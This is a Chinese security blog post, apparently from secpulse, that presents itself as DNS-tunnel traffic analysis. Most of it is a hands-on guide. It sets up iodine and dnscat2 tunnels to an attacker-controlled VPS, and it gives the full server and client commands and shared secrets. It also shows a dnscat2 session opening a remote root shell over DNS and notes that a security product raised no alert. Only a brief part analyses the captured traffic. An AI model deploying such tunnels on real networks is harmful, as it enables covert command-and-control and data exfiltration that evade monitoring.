---
title: 基于安全产品DNS隧道流量分析
url: https://www.secpulse.com/archives/201277.html
source: 安全脉搏
date: 2023-06-03
fetch_date: 2025-10-04T11:45:04.751607
---

# 基于安全产品DNS隧道流量分析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 基于安全产品DNS隧道流量分析

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-06-02

37,660

**声明：**

本文仅限于技术讨论与分享，严禁用于非法途径。若读者因此作出任何危害网络安全行为后果自负，与本号及原作者无关。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677574.gif)

域名准备

选择哪家的云都没问题，这里我选择的TX云，因为之前注册过了，自己拿来做个流量分析不成问题。

#### 域名添加解析记录

需要准备自己的vps作为DNS隧道的服务端，且需要添加ns记录

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677574.png "null")

iodined

关闭53端口关闭开机自启

```
systemctl stop systemd-resolved
systemctl disable systemd-resolved
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-16856775741.png "null")

之后53端口已关闭

启动服务端

```
iodined -f -c -P 1qaz@WSX 192.168.100.1 ns.xxx.xyz -DD
```

参数说明

```
-f：在前台运行
-c：禁止检查所有传入请求的客户端IP地址。
-P：客户端和服务端之间用于验证身份的密码。
-D：指定调试级别，-DD指第二级。“D”的数量随级别增加。
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677575.png "null")

客户端

```
iodine -f -P 1qaz@WSX ns.aligoogle.xyz -M 200
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-16856775751.png "null")

客户端连接正常，且服务端显示客户端连接成功

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677576.png "null")

查看客户端网卡，因为配置的时候一直不太稳定，所以这里服务端分配的虚拟网卡我更换为了`192.168.121.1`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-16856775761.png "null")

测试隧道是否通信

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677577.png "null")

延时比较高，也不稳定。

通过隧道连接目标主机

> ssh -p 2222 root@192.168.121.2

这里我换ssh的端口了

但是发现安全设备在连接高危端口的时候`无告警`

流量分析

抓取dns0网卡的流量

> tcpdump -i dns0 port 53 -w file.pcap

参数-i 指定网卡， port 指定端口，DNS使用53端口，-w 写入文件。

查看日志发现所有的流量都是DNS日志，但是目的都为自己的VPS

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-16856775771.png "null")

其实能够根据流量特征识别工具类型。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677578.png "null")

试错

本来我是想使用穿透工具通过隧道穿透的，这里使用nps做隧道走socks，想走虚拟网卡需要修改nps配置文件

```
./npc -server=192.168.120.1:63323 -vkey=n4jg3lrvg19qlqth -type=tcp
```

查看nps上线后，需要做端口转发，不做端口转发无法直接使用虚拟地址的隧道,这里其实没有这么走的意义

但是这里发现行不通，参考了一些文章，发现某位师傅写的有点儿问题，这里大可不必，没有所谓的套层+转口转发，单一走隧道都不稳定以及卡的要死，怎么玩儿套娃。

dnscat2搭建

安装准备

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
curl -sSL https://get.rvm.io | bash
source /etc/profile.d/rvm.sh
rvm install 2.6.0
source /etc/profile.d/rvm.sh
rvm use 2.6.0
gem install bundler
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677579.png "null")

```
bundle install
ruby ./dnscat2.rb
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677580.png "null")

需要注意这里开放vps的53的udp端口

```
firewall-cmd --zone=public --add-port=53/udp --permanent
firewall-cmd --reload
```

**国内服务器腾讯云的话需要更换源，下载文件需要科学上网，境内下载tools找不到服务**

客户端

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make

./dnscat --dns server=IP,port=53 --secret=f361f307f523b07352d0bab1b765a888    //直连模式
./dnscat --dns server=ling.domain --secret=1qaz2wsx             //中继模式
```

#### 直连模式

Server:

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677582.png "null")

Client:

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-16856775821.png "null")

#### 中继模式

```
ruby ./dnscat2.rb ns.domain -e open -c 1qaz2wsx --no-cache
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677584.png "null")

客户端

```
./dnscat --dns domain=ling.domain --secret=1qaz2wsx
./dnscat --dns server=www.domain --secret=1qaz2wsx
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-1685677585.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201277-16856775851.png "null")

服务端命令

```
sessions 列出所有session
session -i 2 进入session 2
shell:创建交互式shell
suspend:返回上一层
exit:退出
clear（清屏）
delay（修改远程会话超时时间）
exec（执行远程机上的程序）
shell（得到一个反弹shell，此处必须在1::command(kali)中使用）
download/upload（两端之间上传下载文件）
listen <本地端口> <控制端IP/127.0.0.1>:<端口>（端口转发，此处）（此处必须在1::command(kali)中使用）
```

```
dnscat2> session -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (ubuntu) 1> whoami
Error: Unknown command: whoami
command (ubuntu) 1> shell
Sent request to execute a shell
command (ubuntu) 1> New window created: 2
Shell session created!
whoami
Error: Unknown command: whoami
command (ubuntu) 1> session -i 2
New window created: 2
history_size (session) => 1000
Session 2 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

sh (ubuntu) 2> whoami
sh (ubuntu) 2> root
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-c...